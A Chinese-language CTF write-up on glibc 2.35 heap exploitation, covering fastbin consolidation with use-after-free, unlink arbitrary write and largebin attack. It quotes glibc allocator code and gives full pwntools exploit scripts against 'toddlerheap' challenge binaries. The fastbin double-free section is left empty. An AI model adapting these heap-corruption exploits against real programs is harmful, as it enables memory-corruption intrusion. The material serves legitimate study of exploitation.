---
layout: post
tags: [pwn]
title: "glibc 2.35: tcache外的利用手法"
author: wsxk
date: 2025-7-23
comments: true
---

- [1. fastbin consolidation](#1-fastbin-consolidation)
  - [1.1 uaf + fastbin consolidation泄露flag](#11-uaf--fastbin-consolidation泄露flag)
    - [1.1.1 变种： uaf + fastbin consolidation + 防止consolidate的chunk](#111-变种-uaf--fastbin-consolidation--防止consolidate的chunk)
- [2. unlink](#2-unlink)
  - [2.1 unlink实现任意地址写](#21-unlink实现任意地址写)
- [3. largebin attack](#3-largebin-attack)
- [4. fastbin attack](#4-fastbin-attack)
  - [4.1 double free](#41-double-free)


# 1. fastbin consolidation<br>
## 1.1 uaf + fastbin consolidation泄露flag<br>
场景是：<br>
```
1. 只能申请小于0x400的堆块，存放堆地址的空间只够16次
2. flag位于0x450的某个堆块中
3. 存在uaf漏洞
```
核心思路是**构造fastbin中有一个chunk A（与top chunk相邻），利用fastbin consolidation的机制 + uaf，使flag申请下来的0x450的chunk B的起始地址与A一样。打印flag即可**<br>

```python
from pwn import *

binary_path = "/challenge/toddlerheap_level1.0"
#binary_path = "./toddlerheap_level1.0"
p = process(binary_path)

def malloc(idx,size):
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return

def free(idx):
    p.sendline(b"free")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())    
    return

def puts(idx):
    p.sendline(b"puts")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())    
    return

for i in range(8):
    malloc(i,0x70)
for i in range(8):
    free(i)
# gdb.attach(p)
# pause()
p.sendline(b"read_flag")
puts(7)

p.interactive()
```

### 1.1.1 变种： uaf + fastbin consolidation + 防止consolidate的chunk<br> 
一般这种题目的核心思路是**控制chunk的总和满足某个条件**<br>
```python
from pwn import *

binary_path = "/challenge/toddlerheap_level2.1"
binary_path = "./toddlerheap_level2.1"

p = process(binary_path)

def malloc(idx,size):
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return

def free(idx):
    p.sendline(b"free")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())    
    return

def puts(idx):
    p.sendline(b"puts")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())    
    return

def calloc(idx,size):
    p.sendline(b"calloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return    

for i in range(8):
    malloc(i,0x70)
for i in range(8):
    free(i)
calloc(8,0x5b0)# fastbin consolidation: 7 equals 8
malloc(9,0x10) # in case of merging
calloc(10,0x5b0) # break the case
malloc(11,0x10) # in case of merging
free(10)
free(8)

# gdb.attach(p)
# pause()
p.sendline(b"read_flag")
puts(7)

p.interactive()
```

# 2. unlink<br>
`通过unlink能够解链，对某个地址的值进行改写`<br>
unlink的部分代码如下:<br>
```c
static void unlink_chunk (mstate av, mchunkptr p) {
 if (chunksize (p) != prev_size (next_chunk (p)))//检查一
    malloc_printerr ("corrupted size vs. prev_size");
  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;
  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))//检查二
    malloc_printerr ("corrupted double-linked list");
  fd->bk = bk;
  bk->fd = fd;
```
## 2.1 unlink实现任意地址写<br>
前提条件:**一个已知的地址位置存放了一个指针：这个指针指向可以unlink的区域**<br>
绝大多数场景下，这个已知位置指**global pointer**，然后可以unlink的区域指**能够堆溢出的chunk**<br>
```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

#binary = "./toddlerheap_level5.1"
binary = "/challenge/toddlerheap_level5.1"
p = process(binary)


def malloc(idx,size):
    p.recvuntil(b"[*] Function (malloc/read/free/puts/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())


def free(idx):
    p.recvuntil(b"[*] Function (malloc/read/free/puts/quit): ")
    p.sendline(b"free")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())


def puts(idx):
    p.recvuntil(b"[*] Function (malloc/read/free/puts/quit): ")
    p.sendline(b"puts")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())


def read(idx,size,content):
    p.recvuntil(b"[*] Function (malloc/read/free/puts/quit): ")
    p.sendline(b"read")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    #p.recvuntil(b"[*] read(0, allocations")
    p.send(content)


def safe_read(idx,content):
    p.recvuntil(b"[*] Function (malloc/read/free/puts/quit): ")
    p.sendline(b"safe_read")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"[*] read(0, allocations")
    p.send(content)

p.recvuntil(b"Reading the flag into ")
flag_addr = int(p.recvuntil(b".\n").strip(b".\n"),16)
log.success(f"flag_addr: {hex(flag_addr)}")

chunk0_ptr = 0x404140
malloc(0,0x420) 
malloc(1,0x420)
# gdb.attach(p)
# pause()
# create a fake chunk inside chunk0
payload = p64(0)+p64(0x420)+p64(chunk0_ptr-0x18)+p64(chunk0_ptr-0x10)+b"\x00"*(0x420-0x20)
payload += p64(0x420)+p64(0x430) # chunk1 pre_size, size
read(0,len(payload),payload)
free(1) # trigger unlink
# now chunk0_ptr -> &chunk0_ptr -0x18

# mod chunk0_ptr -> flag_addr
payload = b"\x00"*0x18 + p64(flag_addr)
read(0,0x20,payload)

puts(0)
p.interactive()
```


# 3. largebin attack<br>
glibc2.35的情况下，关于large bin的检查有如下两个:(前情提要：**large bin的fd、bk指向相同size的其他chunk，而fd_nextsize、bk_nextsize指向其他放在这个bin中的不同大小的chunk**)<br>
```c
Check 1 : 
>    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
>        malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
Check 2 : 
>    if (bck->fd != fwd)
>        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
```
实际代码如下：<br>
```c
victim_index = largebin_index (size);
bck = bin_at (av, victim_index);//实际返回的总是一对哨兵的 fd 字段地址 —— 也就是该 bin 的头结点
fwd = bck->fd;
/* maintain large bins in sorted order */
// 维护largebin的顺序
if (fwd != bck)
{
  /* Or with inuse bit to speed comparisons */
  size |= PREV_INUSE;
  /* if smaller than smallest, bypass loop below */
  assert(chunk_main_arena(bck->bk));
  if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk))
  {
      fwd = bck;
      bck = bck->bk;

      victim->fd_nextsize = fwd->fd;
      victim->bk_nextsize = fwd->fd->bk_nextsize;
      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;	// 从这里进行任意写利用！
  }
  else
  {
      assert(chunk_main_arena(fwd));
      while ((unsigned long)size < chunksize_nomask(fwd))
      {
          fwd = fwd->fd_nextsize;
          assert(chunk_main_arena(fwd));
      }

      if ((unsigned long)size == (unsigned long)chunksize_nomask(fwd))
          /* Always insert in the second position.  */
          fwd = fwd->fd;
      else
      {
          victim->fd_nextsize = fwd;
          victim->bk_nextsize = fwd->bk_nextsize;
          if (__glibc_unlikely(fwd->bk_nextsize->fd_nextsize != fwd))
              malloc_printerr("malloc(): largebin double linked list corrupted (nextsize)");
          fwd->bk_nextsize = victim;
          victim->bk_nextsize->fd_nextsize = victim;
      }
      bck = fwd->bk;
      if (bck->fd != fwd)
          malloc_printerr("malloc(): largebin double linked list corrupted (bk)");
  }
}
else
  victim->fd_nextsize = victim->bk_nextsize = victim;
}
// 添加到bin中，链表添加成员
mark_bin(av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```


现在利用前提如下：<br>
```
1. largebin chunk的bk_nextsize可以被修改
2. 需要被整理进largebin的unsortedbin chunk size为largebin中的最小
```
exp如下:<br>
```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

#binary = "./toddlerheap_level4.1"
binary = "/challenge/toddlerheap_level4.1"
p = process(binary)


def malloc(idx,size):
    p.recvuntil(b"[*] Function (malloc/safe_read/free/puts/send_flag/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())


def free(idx):
    p.recvuntil(b"[*] Function (malloc/safe_read/free/puts/send_flag/quit): ")
    p.sendline(b"free")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())


def puts(idx):
    p.recvuntil(b"[*] Function (malloc/safe_read/free/puts/send_flag/quit): ")
    p.sendline(b"puts")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())

def safe_read(idx,content):
    p.recvuntil(b"[*] Function (malloc/safe_read/free/puts/send_flag/quit): ")
    p.sendline(b"safe_read")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    #p.recvuntil(b"[*] read(0, allocations")
    p.send(content)


malloc(0,0xbd8)
malloc(1,0xbb8) # guard
malloc(2,0xbc8)
malloc(3,0xbb8) # guard
malloc(4,0xbb8) 
malloc(5,0xbb8) # guard
free(0)
# get main_arena_addr
puts(0)
p.recvuntil(b"Data: ")
main_arena_offset_0x60 =  u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
log.success(f"address:  {hex(main_arena_offset_0x60)}")


malloc(6,0xbe8) # put #0 into largebin
free(2)
malloc(7,0xbe8) # put #2 into largebin
# get heap_addr
puts(0)
p.recvuntil(b"Data: ")
heap_addr =  u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
log.success(f"heap address:  {hex(heap_addr)}")

# gdb.attach(p)
# pause()

# largebin attack
target = 0x4041C0
payload = p64(heap_addr)+p64(main_arena_offset_0x60)+p64(heap_addr)+p64(target-0x20)
safe_read(0,payload)
# pause()
free(4)
#pause()
malloc(8,0xbe8)

p.sendline(b"send_flag")
p.interactive()
```


# 4. fastbin attack<br>
## 4.1 double free<br>
fastbin和tcachebin类似，而且他的double free非常容易实现:<br>




<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>